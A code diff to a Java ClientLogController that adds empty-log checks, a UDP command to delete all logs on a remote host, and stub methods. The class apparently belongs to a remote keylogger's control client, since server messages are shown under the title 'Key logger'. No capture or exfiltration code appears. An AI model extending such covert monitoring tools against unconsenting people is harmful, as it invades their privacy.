@@ -85,6 +85,10 @@ public class ClientLogController {
 	}
 
 	public void saveLog(int logListSelectedIndex) {
+		if (logs.size() == 0) {
+			view.showInfoMessage("Save log", "No logs to save");
+			return;
+		}
 		Log log = logs.get(logListSelectedIndex);
 		try {
 			writeToFile(log);
@@ -102,6 +106,10 @@ public class ClientLogController {
 	}
 
 	public void saveAllLogs() {
+		if (logs.size() == 0) {
+			view.showInfoMessage("Save all logs", "No logs to save");
+			return;
+		}
 		try {
 			for (Log log : logs) {
 				writeToFile(log);
@@ -112,6 +120,32 @@ public class ClientLogController {
 			e.printStackTrace();
 			view.showErrorMessage("Save all logs", "Error:\n" + e.getMessage());
 		}
+	}
+
+	public void deleteAllHostLogs() {
+		try {
+			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).deleteAllHostLogs();
+		} catch (SocketException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (UnknownHostException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
+	public void stopLoggerRemote() {
+		// TODO Auto-generated method stub
+		
+	}
+
+	public void loadAllSavedLogs() {
+		// TODO Auto-generated method stub
+		
+	}
+
+	public void receiveMessageFromServer(String msg) {
+		view.showInfoMessage("Key logger", msg);
 	}
 
 }
